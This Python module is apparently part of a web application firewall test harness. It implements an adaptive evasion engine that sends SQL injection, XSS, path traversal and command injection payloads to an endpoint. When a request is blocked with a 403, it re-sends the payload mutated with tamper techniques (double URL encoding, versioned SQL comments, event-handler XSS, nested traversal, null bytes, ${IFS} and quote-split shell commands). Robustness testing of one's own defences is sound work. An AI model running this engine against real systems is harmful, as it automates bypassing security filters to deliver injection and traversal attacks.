"""Adaptive Evasion Engine with Semantic-Preserving Tamper Mutations.

Task 10.3: Automatically obfuscates and mutates payloads when receiving
HTTP 403 Forbidden responses from the WAF Gateway to evaluate Adversarial Robustness.
"""

from __future__ import annotations

import re
from typing import Any, Callable

from .tools import HttpDispatcher

# -----------------------------------------------------------------------------
# 1. SQL Injection Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_sql_space_to_comment(payload: str) -> str:
    """Replace standard whitespace with SQL inline comments /**/."""
    # Avoid replacing spaces already inside quotes if possible, or replace general spaces
    return re.sub(r"\s+", "/**/", payload)


def tamper_sql_case_randomize(payload: str) -> str:
    """Randomize casing for SQL keywords (e.g. SELECT -> sELecT)."""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "GROUP", "INSERT", "UPDATE"]
    result = payload
    for idx, kw in enumerate(keywords):
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        # Alternate casing deterministically: e.g. sELecT or SeLeCt
        def _casing(match: re.Match[str]) -> str:
            text = match.group(0)
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))

        result = pattern.sub(_casing, result)
    return result


def tamper_sql_double_url_encode(payload: str) -> str:
    """Double URL encode special SQL punctuation characters (' -> %2527)."""
    char_map = {
        "'": "%2527",
        '"': "%2522",
        " ": "%2520",
        "-": "%252d",
        ";": "%253b",
        "=": "%253d",
        "(": "%2528",
        ")": "%2529",
    }
    result = []
    for char in payload:
        result.append(char_map.get(char, char))
    return "".join(result)


def tamper_sql_between_operator(payload: str) -> str:
    """Replace simple equality comparisons like '1=1' with '1 BETWEEN 1 AND 1'."""
    pattern = re.compile(r"(\d+)\s*=\s*(\d+)")
    return pattern.sub(r"\1 BETWEEN \2 AND \2", payload)


def tamper_sql_versioned_comment(payload: str) -> str:
    """Wrap sensitive SQL keywords in MySQL/SQLite style versioned comments /*!50000...*/."""
    keywords = ["UNION", "SELECT"]
    result = payload
    for kw in keywords:
        pattern = re.compile(rf"\b{kw}\b", re.IGNORECASE)
        result = pattern.sub(f"/*!50000{kw}*/", result)
    return result


# -----------------------------------------------------------------------------
# 2. XSS Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_xss_case_randomize(payload: str) -> str:
    """Randomize tag casing in XSS payloads (<script> -> <sCrIpT>)."""
    pattern = re.compile(r"<(/?)([a-zA-Z0-9]+)", re.IGNORECASE)

    def _tag_casing(match: re.Match[str]) -> str:
        slash = match.group(1)
        tag = match.group(2)
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(tag))
        return f"<{slash}{mixed}"

    return pattern.sub(_tag_casing, payload)


def tamper_xss_event_handler(payload: str) -> str:
    """Transform script tags into img/svg event handler payloads."""
    if "<script" in payload.lower():
        # Extract alert or function inside script
        m = re.search(r"<script.*?>(.*?)</script>", payload, re.IGNORECASE | re.DOTALL)
        inner = m.group(1).strip() if m else "alert(1)"
        if not inner:
            inner = "alert(1)"
        return f"<img src=x onerror={inner}>"
    return payload.replace("alert(", "confirm(")


def tamper_xss_html_entity(payload: str) -> str:
    """Replace special brackets with decimal or hex HTML entities."""
    return payload.replace("<", "&#x3C;").replace(">", "&#x3E;")


def tamper_xss_double_url_encode(payload: str) -> str:
    """Double URL encode XSS special punctuation (< -> %253c)."""
    char_map = {
        "<": "%253c",
        ">": "%253e",
        '"': "%2522",
        "'": "%2527",
        "(": "%2528",
        ")": "%2529",
    }
    result = []
    for char in payload:
        result.append(char_map.get(char, char))
    return "".join(result)


# -----------------------------------------------------------------------------
# 3. Path Traversal Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_path_double_encode(payload: str) -> str:
    """Double URL encode directory traversal separators (../ -> ..%252f)."""
    return payload.replace("../", "..%252f").replace("..\\", "..%255c")


def tamper_path_nested_traversal(payload: str) -> str:
    """Use nested traversal sequences (....// -> ../ after single-pass sanitization)."""
    return payload.replace("../", "....//").replace("..\\", "....\\\\")


def tamper_path_backslash_substitute(payload: str) -> str:
    """Replace forward slashes with Windows style backslashes."""
    return payload.replace("/", "\\")


def tamper_path_null_byte_extension(payload: str) -> str:
    """Append null byte dummy extension (%00.jpg)."""
    if not payload.endswith(".jpg") and not payload.endswith(".png"):
        return f"{payload}%00.jpg"
    return payload


# -----------------------------------------------------------------------------
# 4. Command Injection Tamper Mutations
# -----------------------------------------------------------------------------


def tamper_cmd_whitespace_ifs(payload: str) -> str:
    """Replace spaces in command injections with $IFS."""
    return payload.replace(" ", "${IFS}")


def tamper_cmd_quote_concatenation(payload: str) -> str:
    """Concatenate shell commands with quotes (cat -> c'a't)."""
    commands = ["cat", "passwd", "echo", "sh", "bash", "base64", "id", "whoami"]
    result = payload
    for cmd in commands:
        pattern = re.compile(rf"\b{cmd}\b")
        if len(cmd) >= 2:
            split_cmd = f"{cmd[0]}''{cmd[1:]}"
            result = pattern.sub(split_cmd, result)
    return result


def tamper_cmd_subshell(payload: str) -> str:
    """Wrap command arguments in subshell invocation $()."""
    if "|" in payload and "$(" not in payload:
        parts = payload.split("|", 1)
        return f"{parts[0].strip()} | $({parts[1].strip()})"
    return payload


# -----------------------------------------------------------------------------
# Tamper Technique Catalog
# -----------------------------------------------------------------------------

TAMPER_CATALOG: dict[str, dict[str, Callable[[str], str]]] = {
    "SQL_INJECTION": {
        "inline_comment": tamper_sql_space_to_comment,
        "case_randomize": tamper_sql_case_randomize,
        "double_url_encode": tamper_sql_double_url_encode,
        "percent_encoding": tamper_sql_double_url_encode,  # Alias for actions.py
        "between_operator": tamper_sql_between_operator,
        "versioned_comment": tamper_sql_versioned_comment,
    },
    "XSS": {
        "case_randomize": tamper_xss_case_randomize,
        "event_handler": tamper_xss_event_handler,
        "double_url_encode": tamper_xss_double_url_encode,
        "html_entity_encoding": tamper_xss_html_entity,  # Alias for actions.py
    },
    "PATH_TRAVERSAL": {
        "double_url_encode": tamper_path_double_encode,
        "percent_encoding": tamper_path_double_encode,  # Alias for actions.py
        "nested_traversal": tamper_path_nested_traversal,
        "backslash_substitute": tamper_path_backslash_substitute,
        "null_byte_extension": tamper_path_null_byte_extension,
    },
    "COMMAND_INJECTION": {
        "whitespace_variation": tamper_cmd_whitespace_ifs,  # Alias for actions.py
        "whitespace_ifs": tamper_cmd_whitespace_ifs,
        "quote_concatenation": tamper_cmd_quote_concatenation,
        "subshell": tamper_cmd_subshell,
    },
}
# Alias for shorter naming
TAMPER_CATALOG["SQLI"] = TAMPER_CATALOG["SQL_INJECTION"]


class EvasionEngine:
    """Adaptive Evasion Engine orchestrating mutation rounds against the WAF."""

    def __init__(
        self,
        dispatcher: HttpDispatcher | None = None,
        max_attempts: int = 4,
    ) -> None:
        self.dispatcher = dispatcher or HttpDispatcher()
        self.max_attempts = max_attempts

    def get_available_techniques(self, family: str) -> list[str]:
        """Return list of supported tamper techniques for the given attack family."""
        canonical_family = family.upper()
        if canonical_family in TAMPER_CATALOG:
            return list(TAMPER_CATALOG[canonical_family].keys())
        return []

    def mutate(
        self,
        payload: str,
        family: str,
        technique: str | None = None,
        used_techniques: list[str] | None = None,
    ) -> tuple[str, str]:
        """Apply a semantic-preserving mutation.

        Returns:
            Tuple of (mutated_payload, technique_name_used).
        """
        canonical_family = family.upper()
        techniques = TAMPER_CATALOG.get(canonical_family, {})
        if not techniques:
            return payload, "none"

        selected_tech = technique
        if not selected_tech or selected_tech not in techniques:
            # Pick first technique not in used_techniques
            used = set(used_techniques or [])
            available = [t for t in techniques if t not in used]
            selected_tech = available[0] if available else list(techniques.keys())[0]

        mutator = techniques[selected_tech]
        try:
            mutated = mutator(payload)
            return mutated, selected_tech
        except Exception:
            return payload, "none"

    def adaptive_evasion_round(
        self,
        method: str,
        path: str,
        param_name: str,
        baseline_payload: str,
        family: str,
        request_type: str = "query",
        extra_fields: dict[str, Any] | None = None,
        bypass_keywords: list[str] | None = None,
    ) -> dict[str, Any]:
        """Execute a full multi-round adaptive evasion engagement.

        Workflow:
        1. Round 1: Dispatch baseline payload.
        2. If 403 Blocked: iteratively apply tamper mutations and re-dispatch.
        3. Terminate immediately upon confirmed bypass or reaching max_attempts.
        4. Return structured Battle Telemetry dictionary for AI Arena / logs.
        """
        rounds_telemetry: list[dict[str, Any]] = []
        used_techniques: list[str] = []

        current_payload = baseline_payload
        current_technique = "baseline_probe"
        bypassed = False
        final_threat_score: float | None = None

        for attempt in range(1, self.max_attempts + 1):
            # 1. Build request parameters or JSON payload
            params = None
            json_data = None
            if request_type == "query":
                params = {param_name: current_payload}
                if extra_fields:
                    params.update(extra_fields)
            else:
                json_data = {param_name: current_payload}
                if extra_fields:
                    json_data.update(extra_fields)

            # 2. Dispatch request
            dispatch_res = self.dispatcher.dispatch(
                method=method,
                path=path,
                params=params,
                json_data=json_data,
                bypass_detection_keywords=bypass_keywords,
            )

            final_threat_score = dispatch_res.waf_threat_score
            round_info = {
                "round": attempt,
                "technique": current_technique,
                "payload": current_payload,
                "status_code": dispatch_res.status_code,
                "is_blocked": dispatch_res.is_blocked,
                "waf_action": dispatch_res.waf_action,
                "threat_score": dispatch_res.waf_threat_score,
                "latency_ms": dispatch_res.latency_ms,
                "confirmed_bypass": dispatch_res.confirmed_bypass,
            }
            rounds_telemetry.append(round_info)
            used_techniques.append(current_technique)

            # 3. Check for bypass
            if dispatch_res.confirmed_bypass or (dispatch_res.status_code == 200 and not dispatch_res.is_blocked):
                bypassed = True
                break

            # 4. If blocked on 403, mutate for the next attempt
            if dispatch_res.is_blocked and attempt < self.max_attempts:
                current_payload, current_technique = self.mutate(
                    payload=baseline_payload,
                    family=family,
                    used_techniques=used_techniques,
                )

        return {
            "endpoint": path,
            "method": method.upper(),
            "family": family,
            "success": bypassed,
            "total_rounds": len(rounds_telemetry),
            "winning_technique": current_technique if bypassed else None,
            "baseline_payload": baseline_payload,
            "final_payload": current_payload,
            "final_threat_score": final_threat_score,
            "rounds": rounds_telemetry,
        }

    # Convenient alias for adaptive_evasion_round
    evade = adaptive_evasion_round

